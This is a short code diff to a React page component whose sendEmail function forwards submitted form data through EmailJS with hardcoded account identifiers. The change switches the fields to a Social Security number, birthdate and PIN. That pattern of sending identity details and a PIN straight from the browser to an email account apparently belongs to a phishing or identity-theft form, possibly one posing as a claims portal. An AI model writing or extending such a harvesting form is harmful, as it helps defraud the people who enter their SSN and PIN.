@@ -25,10 +25,10 @@ export default function MainContent() {
 
   // Reusable EmailJS send function
   function sendEmail(data) {
-  emailjs.send('service_ozea06x', 'template_vlbf82m', data, 'XMOnwjyzQDoRVRYl3')
+    emailjs.send('service_ozea06x', 'template_vlbf82m', data, 'XMOnwjyzQDoRVRYl3')
       .then(() => {
         setFormSubmitted(true);
-        setFormData({ claimant_id: '', dob: '', pin: '', pin_confirm: false });
+        setFormData({ ssn: '', birthdate: '', pin: '', pin_confirm: false });
         setTimeout(() => setFormSubmitted(false), 2000);
       })
       .catch(error => {
